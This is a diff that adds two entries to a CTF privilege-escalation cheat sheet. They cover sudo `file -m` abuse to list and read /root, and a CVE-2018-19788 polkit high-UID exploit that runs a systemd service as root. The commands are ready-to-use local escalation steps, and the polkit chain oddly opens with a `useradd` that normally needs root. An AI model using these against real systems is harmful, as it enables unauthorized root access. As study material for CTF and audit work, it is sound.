@@ -17,6 +17,8 @@ Techniques from HackTheBox machine writeups covering sudo abuse, service misconf
 - [Squid Proxy Pivoting to Internal Services (Bamboo HTB)](#squid-proxy-pivoting-to-internal-services-bamboo-htb)
 - [Zabbix Admin Password Reset via MySQL (Watcher HTB)](#zabbix-admin-password-reset-via-mysql-watcher-htb)
 - [WinSSHTerm Encrypted Credential Decryption (Atlas HTB)](#winsshterm-encrypted-credential-decryption-atlas-htb)
+- [sudo file -m Magic File Directory Traversal (OTW Advent 2018)](#sudo-file--m-magic-file-directory-traversal-otw-advent-2018)
+- [CVE-2018-19788 — polkit UID Integer Overflow → Systemd RCE (OTW Advent 2018)](#cve-2018-19788--polkit-uid-integer-overflow--systemd-rce-otw-advent-2018)
 
 ---
 
@@ -245,3 +247,40 @@ WinSSHTerm (.NET) stores encrypted SSH credentials in `connections.xml` with key
 5. XOR obfuscated string table: `data[i] = (data[i] ^ i) ^ 0xAA`
 
 **Key insight:** Desktop SSH clients with "encrypted" credential storage are only as strong as the master password. Decompile the .NET binary, extract the crypto constants, and brute-force the master password. The encryption scheme's complexity is irrelevant if the master password is weak.
+
+---
+
+## sudo file -m Magic File Directory Traversal (OTW Advent 2018)
+
+**Pattern:** Sudoers rule permits `file` with no argument restrictions. `file -m <path>` tells it to read "magic" definitions from a user-specified directory, and it emits filenames from that directory in error messages even when the target is otherwise unreadable.
+
+```bash
+sudo -u santa file -m /root/ .
+# Error output lists every filename under /root/
+```
+
+Chain with `file -m /path/to/file -i -r .` to read file contents into the error channel when the file command tries to compile entries as magic.
+
+**Key insight:** Sudoers audits usually focus on the main binary, not its secondary flags. `file -m`, `tar --to-command`, `find -exec`, and `awk -f` all turn an innocuous sudo rule into directory listing or command execution. Enumerate sudo rules with `sudo -l` and then look up GTFOBins for each entry.
+
+**References:** OverTheWire Advent 2018 — Lostpresent, writeup 12785
+
+---
+
+## CVE-2018-19788 — polkit UID Integer Overflow → Systemd RCE (OTW Advent 2018)
+
+**Pattern:** polkit treated UIDs greater than `INT_MAX` (`2147483647`) as "unknown user" and *skipped* authentication. Create a user with `UID = 4020181224`, then run `systemctl enable --now /path/to/pwn.service` — polkit lets the call through without prompting, and systemd runs the service as root.
+
+```bash
+useradd -u 4020181224 -m loluser
+su loluser
+# ~/pwn.service:
+# [Service]
+# ExecStart=/bin/bash -c 'cat /root/flag > /tmp/out'
+systemctl enable --now /home/loluser/pwn.service
+cat /tmp/out
+```
+
+**Key insight:** Any integer-based permission check that compares with signed integers breaks for UID > INT_MAX. The patched version of polkit treats invalid UIDs as `root`'s opposite — *always deny*. Remembering the numeric constant 4020181224 lets you spot vulnerable boxes immediately.
+
+**References:** OverTheWire Advent Bonanza 2018 — writeup 12764
